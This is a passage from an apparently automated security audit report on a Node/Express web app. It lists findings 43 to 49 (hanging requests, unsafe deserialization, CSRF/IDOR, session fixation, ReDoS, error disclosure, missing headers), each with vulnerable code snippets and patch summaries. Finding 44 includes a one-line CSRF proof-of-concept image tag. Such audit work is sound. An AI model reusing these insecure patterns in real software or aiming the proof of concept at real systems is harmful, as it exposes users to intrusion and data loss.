  - **Sink**: `hung HTTP response / socket exhaustion`
- Evidence: src/router/routes/system.js:13-22 try execSync curl with brand param; catch at :20 only console.log(e) with no res.send/redirect/end, leaving HTTP request hanging until timeout
  - Validation: src/router/routes/system.js:17 execSync may throw; src/router/routes/system.js:20 catch only console.log(e) with no res.* leaving request hanging
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:17 execSync may throw; src/router/routes/system.js:20 catch only console.log(e) with no res.* leaving request hanging | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Send error response in catch path (res.status(500).end) and avoid shell execution

<a id="finding-43"></a>
### MEDIUM Missing Response Hanging Request in POST /v1/init
- CVSS: **4.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) | CWE: CWE-248 | confidence: 0.9
- Location: `src/router/routes/system.js:61-64`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
app.post('/v1/init', (req,res) =>{
        var serialize = require('node-serialize');
        const body = req.body.object;
        var deser = serialize.unserialize(body)
```
- Taint Flow:
  - **Source**: `unauthenticated POST body.object to /v1/init`
  - **Path**:
    - `src/router/routes/system.js:61 POST /v1/init entry`
    - `src/router/routes/system.js:64 node-serialize unserialize, no res.* follows`
  - **Sink**: `never-terminated HTTP response`
- Evidence: src/router/routes/system.js:61-72 POST /v1/init handler calls serialize.unserialize and console.log but contains zero res.* calls on any path, so every request hangs
  - Validation: src/router/routes/system.js:61 POST /v1/init handler calls serialize.unserialize then only console.log with zero res.* on any path
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:61 POST /v1/init handler calls serialize.unserialize then only console.log with zero res.* on any path | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Terminate every path with res.send/status and remove node-serialize deserialization

<a id="finding-44"></a>
### MEDIUM CSRF and IDOR in GET /v1/love/:beer_id
- CVSS: **4.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) | CWE: CWE-352 | confidence: 0.9
- Location: `src/router/routes/user.js:118-118`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
app.get('/v1/love/:beer_id', (req,res) =>{
```
- Taint Flow:
  - **Source**: `req.query.id (attacker-chosen)`
  - **Path**:
    - `req.query.id + params.beer_id -> addBeer`
  - **Sink**: `state-changing association`
- Evidence: app.get('/v1/love/:beer_id', (req,res) =>{
  - Validation: src/router/routes/user.js:118 app.get('/v1/love/:beer_id') uses attacker-chosen req.query.id + req.params.beer_id to call addBeer with no session/auth check and no CSRF token; state change via GET
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:118 app.get('/v1/love/:beer_id') uses attacker-chosen req.query.id + req.params.beer_id to call addBeer with no session/auth check and no CSRF token; state change via GET | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
<img src='http://localhost:5000/v1/love/1?id=1&front=true'>  # GET changes state
```
- Patch:
  - **Summary**: Require session/JWT ownership check for current_user_id and move state change to POST with CSRF token; reject cross-user id.

<a id="finding-45"></a>
### MEDIUM Session Fixation in GET /login: No Session Regeneration on Authentication
- CVSS: **4.6** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) | CWE: CWE-384 | confidence: 0.85
- Location: `src/router/routes/frontend.js:126-126`
- Vulnerable code (`src/router/routes/frontend.js`):
```javascript
req.session.logged = true
```
- Evidence: src/router/routes/frontend.js:126 sets req.session.logged=true on login success with no req.session.regenerate(); server uses saveUninitialized:true and predictable genid
  - Validation: src/router/routes/frontend.js:126 sets req.session.logged=true with no regenerate; src/server.js:44 predictable genid plus saveUninitialized:true
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:126 sets req.session.logged=true with no regenerate; src/server.js:44 predictable genid plus saveUninitialized:true | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Call req.session.regenerate() on successful login, use random genid and saveUninitialized:false

<a id="finding-46"></a>
### MEDIUM ReDoS via Nested-Quantifier Email Regex on Unauthenticated Endpoints
- CVSS: **4.4** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) | CWE: CWE-1333 | confidence: 0.75
- Location: `src/router/routes/user.js:89-89`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
var emailExpression = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
```
- Taint Flow:
  - **Source**: `unbounded email input`
  - **Path**:
    - `src/router/routes/user.js:83 req.body.email`
    - `src/router/routes/user.js:92 emailExpression.test`
  - **Sink**: `regex evaluation`
- Evidence: src/router/routes/user.js:89 nested-quantifier email regex evaluated on unbounded attacker email with no length cap or rate limit; same pattern in frontend.js:71
  - Validation: src/router/routes/user.js:89 nested-quantifier email regex (([a-zA-Z0-9-]+)+\.)+ with src/router/routes/user.js:92 .test on unbounded req.body.email; same pattern src/router/routes/frontend.js:71 on req.query.email with no length cap or rate limit
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:89 nested-quantifier email regex (([a-zA-Z0-9-]+)+\.)+ with src/router/routes/user.js:92 .test on unbounded req.body.email; same pattern src/router/routes/frontend.js:71 on req.query.email with no length cap or rate limit | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Replace custom regex with validator/length-capped check and enforce max email length plus rate limiting.

<a id="finding-47"></a>
### LOW Verbose Database Error Disclosure in Search Endpoint
- CVSS: **2.4** (`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N`) | CWE: CWE-209 | confidence: 0.9
- Location: `src/router/routes/order.js:71-71`
- Vulnerable code (`src/router/routes/order.js`):
```javascript
res.status(501).send("error, query failed: "+err)
```
- Taint Flow:
  - **Source**: `URL params reflected via DB error`
  - **Path**:
    - `src/router/routes/order.js:63 req.params.filter/query`
    - `src/router/routes/order.js:71 err`
  - **Sink**: `HTTP 501 body with driver error`
- Evidence: src/router/routes/order.js:71 concatenates raw err into 501 response, disclosing SQL and driver stack to aid SQLi
  - Validation: src/router/routes/order.js:71 res.status(501).send concatenates raw err from interpolated SQL at src/router/routes/order.js:64
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/order.js:71 res.status(501).send concatenates raw err from interpolated SQL at src/router/routes/order.js:64 | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Return generic error to client and log driver error server-side only

<a id="finding-48"></a>
### LOW Missing Security Headers (CSP/HSTS/X-Frame) Disabled in Server
- CVSS: **2.4** (`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N`) | CWE: CWE-693 | confidence: 0.9
- Location: `src/server.js:19-24`
- Vulnerable code (`src/server.js`):
```javascript
//OPTIONAL: Security headers?????
// app.use((req, res, next) => {
```
- Taint Flow:
  - **Source**: `all HTTP responses from Express app`
  - **Path**:
    - `src/server.js:19 headers disabled`
    - `src/router/routes/frontend.js:16 nunjucks.renderString + |safe templates`
  - **Sink**: `browser enforcement missing (CSP/X-Frame/HSTS)`
- Evidence: src/server.js:19-29 security-header middleware is fully commented out and no helmet/CSP/HSTS/X-Frame-Options/Cache-Control set anywhere in src; responses render user-controlled data with |safe
  - Validation: src/server.js:19 security-header middleware fully commented out with no helmet/CSP/HSTS set anywhere; session cookie secure:false/httpOnly:false
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/server.js:19 security-header middleware fully commented out with no helmet/CSP/HSTS set anywhere; session cookie secure:false/httpOnly:false | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Enable helmet/CSP/HSTS/X-Frame-Options and set Secure/HttpOnly/SameSite cookies

<a id="finding-49"></a>
### LOW Sensitive Error Disclosure in GET /v1/test SSRF Handler
- CVSS: **2.3** (`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N`) | CWE: CWE-209 | confidence: 0.85
- Location: `src/router/routes/system.js:89-89`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
res.json({response:error});
```
- Evidence: src/router/routes/system.js:89 returns full axios error object to client; distinct endpoint from order.js:71 DB error disclosure
  - Validation: src/router/routes/system.js:75 var url=req.query.url fed to axios.get; src/router/routes/system.js:89 res.json({response:error}) returns full axios error object on failure with no filtering
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:75 var url=req.query.url fed to axios.get; src/router/routes/system.js:89 res.json({response:error}) returns full axios error object on failure with no filtering | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Return generic error message/status instead of full axios error object; log details server-side only.
